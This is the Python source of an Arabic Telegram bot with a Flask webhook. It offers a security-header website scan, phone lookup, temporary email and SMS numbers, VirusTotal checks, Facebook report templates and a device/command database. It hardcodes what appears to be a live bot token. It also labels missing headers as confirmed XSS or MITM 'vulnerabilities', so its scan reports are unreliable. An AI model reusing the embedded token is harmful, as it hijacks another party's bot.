# -*- coding: utf-8 -*-

"""
البوت النهائي - نظام ANONYMOUS_T11
الإصدار النهائي المتكامل - يعمل بجميع الميزات بشكل حقيقي
مع تفعيل Webhook، إصلاح KeyError، وآلية Keep-alive
"""

import os
import sys
import time
import json
import logging
import base64
import re
import secrets
import string
import shutil
import sqlite3
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import socket
import builtwith
import threading
import requests as req_lib

# ===================== معالجة استثناءات الاستيراد =====================
try:
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier
    from flask import Flask, request, jsonify, render_template_string, send_file
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import pypdf
    from bs4 import BeautifulSoup
    from dotenv import load_dotenv
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from PIL import Image
    import yt_dlp
except Exception as e:
    print(f"❌ فشل استيراد مكتبة: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== متغيرات البيئة الأساسية =====================
TELEGRAM_TOKEN = "8852940754:AAF3bLOKUtk2YwC2EcQaXXHx-fPkkTaL2Ho"
ADMIN_ID = 7965377136
ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL', 'https://my-t99-bot.onrender.com')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')
HUGGINGFACE_API_KEY = os.environ.get('HUGGINGFACE_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', 'default_secret_key_please_change')

if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry =====================
def get_requests_session(retries=5, backoff_factor=1.0, pool_connections=10, pool_maxsize=20):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=pool_connections,
        pool_maxsize=pool_maxsize
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)

# ===================== مسار Webhook =====================
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            logger.info(f"✅ Webhook received: {json_string[:200]}...")
            update = Update.de_json(json_string)
            if update:
                bot.process_new_updates([update])
                logger.info(f"✅ تم إرسال التحديث للمعالجة: {update.update_id}")
                return '!', 200
            else:
                logger.error("❌ Invalid update object.")
                return 'Invalid update', 400
        else:
            logger.warning("⚠️ Non-JSON content-type received.")
            return 'Forbidden', 403
    except Exception as e:
        logger.error(f"❌ Webhook processing error: {e}")
        return 'Error', 500

# ===================== مسار تعيين Webhook يدوياً =====================
@app.route('/set_webhook', methods=['GET'])
def set_webhook_route():
    webhook_url = f"{SERVER_URL}/webhook"
    try:
        bot.remove_webhook()
        time.sleep(1)
        success = bot.set_webhook(url=webhook_url)
        if success:
            return f"✅ Webhook تم تعيينه بنجاح: {webhook_url}", 200
        else:
            return "❌ فشل تعيين Webhook", 500
    except Exception as e:
        return f"❌ خطأ: {str(e)}", 500

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0,
            welcome_sent INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال قاعدة البيانات =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by, welcome_sent)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def is_new_user(chat_id):
    user = get_user(chat_id)
    if user is None:
        return True
    return user.get('welcome_sent', 0) == 0

def mark_welcome_sent(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET welcome_sent = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_user_points(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return row['points']
        return 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        rows = c.fetchall()
        return [{'amount': row['amount'], 'reason': row['reason'], 'created_at': row['created_at']} for row in rows]

def is_user_banned(chat_id):
    user = get_user(chat_id)
    if user is None:
        return False
    return user.get('is_banned', 0) == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        rows = c.fetchall()
        return [dict(row) for row in rows]

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices")
        rows = c.fetchall()
        return [dict(row) for row in rows]

def save_registered_device_db(device_id, chat_id):
    save_device(device_id, chat_id, 'unknown', '', '')

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev.get('blocked_domains'):
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except json.JSONDecodeError:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev.get('type') and 'طفل' in dev['type']:
            history = []
            if dev.get('history'):
                try:
                    history = json.loads(dev['history'])
                except json.JSONDecodeError:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== تقرير فحص الثغرات =====================
def advanced_website_scan(url):
    report = {}
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        report['url'] = url
        
        try:
            tech = builtwith.builtwith(url)
            report['technologies'] = tech
        except Exception as e:
            report['technologies'] = f"فشل في التحليل: {str(e)}"
        
        try:
            response = REQUEST_SESSION.get(url, timeout=15, allow_redirects=True)
            headers = response.headers
            security_headers = {
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
                'Permissions-Policy': headers.get('Permissions-Policy')
            }
            report['security_headers'] = security_headers
            report['status_code'] = response.status_code
            report['server'] = headers.get('Server', 'غير معروف')
            try:
                domain = url.split('/')[2] if '://' in url else url
                ip = socket.gethostbyname(domain)
                report['ip'] = ip
                ip_info = REQUEST_SESSION.get(f"http://ip-api.com/json/{ip}", timeout=10)
                if ip_info.status_code == 200:
                    data = ip_info.json()
                    if data.get('status') == 'success':
                        report['ip_details'] = {
                            'country': data.get('country'),
                            'city': data.get('city'),
                            'isp': data.get('isp'),
                            'lat': data.get('lat'),
                            'lon': data.get('lon')
                        }
                    else:
                        report['ip_details'] = 'لا توجد معلومات'
            except Exception as e:
                report['ip'] = f"فشل: {str(e)}"
        except Exception as e:
            report['security_headers'] = f"فشل الجلب: {str(e)}"
        
        vulnerabilities = []
        if isinstance(report.get('security_headers'), dict):
            sec = report['security_headers']
            if not sec.get('Content-Security-Policy'):
                vulnerabilities.append("ثغرة XSS: بسبب فقدان Content-Security-Policy.")
            if sec.get('X-Content-Type-Options') != 'nosniff':
                vulnerabilities.append("ثغرة MIME Sniffing: بسبب فقدان X-Content-Type-Options.")
            if not sec.get('X-Frame-Options'):
                vulnerabilities.append("ثغرة Clickjacking: بسبب فقدان X-Frame-Options.")
            if not sec.get('Strict-Transport-Security'):
                vulnerabilities.append("ثغرة MITM: بسبب فقدان HSTS.")
            if not sec.get('Referrer-Policy'):
                vulnerabilities.append("ثغرة تسريب معلومات: بسبب فقدان Referrer-Policy.")
            if not sec.get('Permissions-Policy'):
                vulnerabilities.append("ثغرة صلاحيات: بسبب فقدان Permissions-Policy.")
        
        risk_level = "🟢 منخفض"
        if len(vulnerabilities) >= 4:
            risk_level = "🔴 خطر عالٍ - يُنصح بعدم إدخال بيانات حساسة"
        elif len(vulnerabilities) >= 2:
            risk_level = "🟠 خطر متوسط"
        
        final_report = "==================================================\n"
        final_report += "🛡️ تقرير الفحص الأمني الرقمي\n"
        final_report += f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d | ⏰ الوقت: %H:%M:%S')}\n"
        final_report += "==================================================\n\n"
        
        final_report += "🌐 معلومات النطاق:\n"
        final_report += f"• النطاق: {url.split('/')[2] if '://' in url else url}\n"
        final_report += f"• الرابط: {url}\n\n"
        
        final_report += "🌍 بيانات الموقع الجغرافي والتقني:\n"
        final_report += f"• السيرفر: {report.get('server', 'غير معروف')}\n"
        if 'ip_details' in report and isinstance(report['ip_details'], dict):
            ipd = report['ip_details']
            final_report += f"• الموقع: {ipd.get('country', 'غير معروف')}, {ipd.get('city', 'غير معروف')}\n"
            final_report += f"• مزود الخدمة: {ipd.get('isp', 'غير معروف')}\n"
        else:
            final_report += "• الموقع: غير معروف\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += "🔒 حالة ترويسات الأمان (Security Headers):\n"
        final_report += "--------------------------------------------------\n"
        if isinstance(report.get('security_headers'), dict):
            sec = report['security_headers']
            for h, v in sec.items():
                status = "✅" if v else "❌"
                if h == 'Content-Security-Policy':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر XSS)'}\n"
                elif h == 'X-Content-Type-Options':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر MIME Sniffing)'}\n"
                elif h == 'X-Frame-Options':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر Clickjacking)'}\n"
                elif h == 'Strict-Transport-Security':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر MITM)'}\n"
                else:
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة'}\n"
        else:
            final_report += "⚠️ تعذر الحصول على الترويسات.\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += "🚨 تقرير الثغرات المكتشفة:\n"
        final_report += "--------------------------------------------------\n"
        if vulnerabilities:
            final_report += f"تم اكتشاف ({len(vulnerabilities)}) ثغرات أمنية في هذا الموقع:\n\n"
            for i, vuln in enumerate(vulnerabilities, 1):
                final_report += f"{i}️⃣ {vuln}\n"
        else:
            final_report += "✅ لم يتم اكتشاف أي ثغرات أمنية واضحة.\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += f"⚖️ التقييم النهائي: [ {risk_level} ]\n"
        final_report += "--------------------------------------------------\n\n"
        final_report += "📋 توصيات المطور:\n"
        final_report += "• يُرجى إضافة الترويسات المذكورة أعلاه في إعدادات السيرفر فوراً.\n"
        final_report += "• تفعيل بروتوكول HSTS لضمان اتصال مشفر دائم.\n"
        final_report += "• مراجعة سياسات الأمان بشكل دوري.\n"
        final_report += "==================================================\n"
        
        return final_report
    except Exception as e:
        logger.error(f"Advanced scan error: {e}")
        return f"⚠️ فشل الفحص المتقدم: {str(e)}"

# ===================== دوال الخدمات الأخرى =====================
def scan_website(url):
    return advanced_website_scan(url), "safe"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 الرقم: {phone}\n"
                f"🌍 البلد: {country}\n"
                f"📍 المنطقة: {region}\n"
                f"📡 المشغل: {carrier_name}", "valid")
    except Exception as e:
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def create_temp_email_real():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
        password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
        register = REQUEST_SESSION.post("https://api.mail.tm/accounts", 
                                       json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = REQUEST_SESSION.post("https://api.mail.tm/token", 
                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 من: {msg.get('from', {}).get('address', '')}\n📌 الموضوع: {msg.get('subject', '')}\n📝 مقتطف: {msg.get('intro', '')[:150]}...")
            return results
    except:
        pass
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ مفتاح VirusTotal غير مضبوط. يرجى إضافة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 تم اكتشاف {malicious} تهديدات!", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ تم اكتشاف {suspicious} عناصر مشبوهة.", "suspicious"
                    else:
                        return "✅ الملف آمن.", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}", "error"

def generate_fb_report(report_type, reason, link):
    templates = {
        "📢 منشور مسيء": f"""Dear Facebook Support Team,

I am writing to formally report a post that violates Facebook's Community Standards regarding Hate Speech and Offensive Content.

The post contains content that is highly offensive and violates Facebook's policies. I kindly request that you review this content and take appropriate action.

Link (if available): {link if link else 'Not provided'}

Description of the issue:
{reason}

Thank you for your attention to this matter.

Sincerely,
A concerned Facebook user""",
        "👤 حساب مزيف": f"""Dear Facebook Support Team,

I am writing to report a fake account that is impersonating me or someone I know. This account is using my personal information and photos without my consent.

Account Link: {link if link else 'Not provided'}

Details:
{reason}

I request that you investigate this account and take action to remove it as it violates Facebook's policies against impersonation.

Thank you for your help.

Sincerely,
A concerned Facebook user""",
        "🔒 انتهاك خصوصية": f"""Dear Facebook Support Team,

I am writing to report a privacy violation on Facebook. My personal information or content has been shared without my consent.

Link: {link if link else 'Not provided'}

Description:
{reason}

I request that you review this issue and take appropriate action to protect my privacy.

Thank you.

Sincerely,
A concerned Facebook user""",
        "⚠️ تحرش أو مضايقة": f"""Dear Facebook Support Team,

I am reporting a case of harassment or bullying on Facebook. The following content or account is causing me distress.

Link: {link if link else 'Not provided'}

Details:
{reason}

I urge you to investigate this matter and take immediate action.

Thank you.

Sincerely,
A concerned Facebook user""",
        "🎭 انتحال شخصية": f"""Dear Facebook Support Team,

I am reporting an account that is impersonating me or a public figure. This is a clear violation of Facebook's policies.

Link: {link if link else 'Not provided'}

Additional Information:
{reason}

Please take action to remove this impersonating account.

Thank you.

Sincerely,
A concerned Facebook user""",
        "💢 محتوى عنيف": f"""Dear Facebook Support Team,

I am reporting content that contains violence or promotes violent behavior. This content violates Facebook's Community Standards.

Link: {link if link else 'Not provided'}

Description:
{reason}

I request immediate review and action.

Thank you.

Sincerely,
A concerned Facebook user"""
    }
    for key in templates:
        if key in report_type:
            return templates[key]
    return f"""Dear Facebook Support Team,

I am writing to report content that violates Facebook's Community Standards regarding {report_type}.

Issue Description:
{reason}

Link: {link if link else 'Not provided'}

I kindly request that you review this matter and take appropriate action.

Thank you for your attention.

Sincerely,
A concerned Facebook user"""

def extract_text_from_pdf(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    return f"📚 الإجابة: {relevant_chunk[:500]}..."

def fetch_temp_numbers_advanced(limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

def download_video(url):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                return downloaded_file, None
            else:
                return None, "⚠️ فشل تحميل الفيديو: الملف فارغ أو تالف."
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None, f"⚠️ فشل تحميل الفيديو: {str(e)[:100]}"

def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
            else:
                return None, data.get('errormessage', 'خطأ غير معروف')
        else:
            return None, f"فشل الاتصال (كود {response.status_code})"
    except Exception as e:
        return None, f"خطأ: {str(e)}"

def check_domain_virustotal(domain):
    if VIRUSTOTAL_API_KEY:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}"
            headers = {"x-apikey": VIRUSTOTAL_API_KEY}
            response = REQUEST_SESSION.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                malicious = stats.get('malicious', 0)
                suspicious = stats.get('suspicious', 0)
                result = f"🌐 تحليل النطاق: {domain}\n"
                result += f"🛡️ نتائج الفحص:\n"
                result += f"   - ضار: {malicious}\n"
                result += f"   - مشبوه: {suspicious}\n"
                result += f"   - آمن: {stats.get('harmless', 0)}\n"
                if malicious > 0:
                    result += "🚨 **تحذير: تم اكتشاف تهديدات!**"
                elif suspicious > 0:
                    result += "⚠️ **تنبيه: يوجد عناصر مشبوهة**"
                else:
                    result += "✅ **النطاق يبدو آمناً.**"
                return result
        except Exception as e:
            logger.error(f"VirusTotal error: {e}")
    return f"🌐 النطاق: {domain}\n⚠️ لم تتوفر معلومات فحص كافية."

def perform_vulnerability_scan(target_ip, target_domain, target_url):
    if target_url:
        return advanced_website_scan(target_url)
    elif target_domain:
        return advanced_website_scan(f"https://{target_domain}")
